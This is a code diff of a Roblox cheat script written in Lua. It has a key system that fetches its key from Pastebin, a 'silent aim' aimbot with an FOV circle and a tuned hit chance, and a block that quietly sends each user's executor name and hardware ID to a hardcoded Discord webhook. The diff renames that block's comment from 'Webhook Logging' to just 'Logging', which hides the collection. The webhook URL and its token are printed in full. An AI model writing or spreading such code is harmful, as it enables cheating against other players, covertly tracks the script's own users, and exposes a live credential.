@@ -6,7 +6,7 @@ local RunService = game:GetService("RunService")
 
 local LocalPlayer = Players.LocalPlayer
 
--- Get Key from Pastebin
+-- === Key System ===
 local correctKey = nil
 pcall(function()
 	local req = syn and syn.request or http_request or request
@@ -19,7 +19,7 @@ pcall(function()
 	end
 end)
 
--- UI
+-- === UI ===
 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.Name = "KeySystem"
 
@@ -86,10 +86,9 @@ submit.MouseButton1Click:Connect(function()
 		gui:Destroy()
 		blur:Destroy()
 
-		-- === Webhook Logging ===
+		-- === Logging ===
 		local camera = Workspace.CurrentCamera
 		local mouse = LocalPlayer:GetMouse()
-
 		local webhook = "https://discord.com/api/webhooks/1385113796963598356/px_zeWfFa2yDChxhrX1t1KR-yLy6_253oVRu0NAxNm8MifIs6WZK6WuRe2qGaN1nfpow"
 		local executor = identifyexecutor and identifyexecutor() or "Unknown"
 		local hwid = (syn and syn.gethwid and syn.gethwid()) or (gethwid and gethwid()) or "Unavailable"
@@ -117,7 +116,7 @@ submit.MouseButton1Click:Connect(function()
 			end
 		end)
 
-		-- === Silent Aim ===
+		-- === FOV Circle ===
 		local fovCircle = Drawing.new("Circle")
 		fovCircle.Visible = true
 		fovCircle.Filled = false
@@ -131,6 +130,7 @@ submit.MouseButton1Click:Connect(function()
 			fovCircle.Position = Vector2.new(mouse.X + 1, mouse.Y + 36)
 		end)
 
+		-- === Silent Aim Functions ===
 		local function isKnocked(char)
 			local hum = char:FindFirstChildOfClass("Humanoid")
 			local KO = char:FindFirstChild("K.O") or char:FindFirstChild("Knocked")
@@ -141,25 +141,25 @@ submit.MouseButton1Click:Connect(function()
 
 		local function hasLineOfSight(part)
 			local origin = camera.CFrame.Position
-			local direction = (part.Position - origin)
+			local direction = (part.Position - origin).Unit * 999
 			local rayParams = RaycastParams.new()
 			rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
 			rayParams.FilterType = Enum.RaycastFilterType.Blacklist
 			rayParams.IgnoreWater = true
 			local result = Workspace:Raycast(origin, direction, rayParams)
-			if result and result.Instance then
+			if result then
 				return part:IsDescendantOf(result.Instance:FindFirstAncestorOfClass("Model"))
 			end
-			return false
+			return true
 		end
 
 		local function getPing()
 			local ping = LocalPlayer:GetNetworkPing()
-			return ping and ping / 1000 or 0.1 -- fallback to 100ms
+			return ping and ping / 1000 or 0.1
 		end
 
 		local function shouldHit()
-			return math.random() <= 0.7 -- 70% hit chance
+			return math.random() <= 0.7
 		end
 
 		local function getClosestPart()
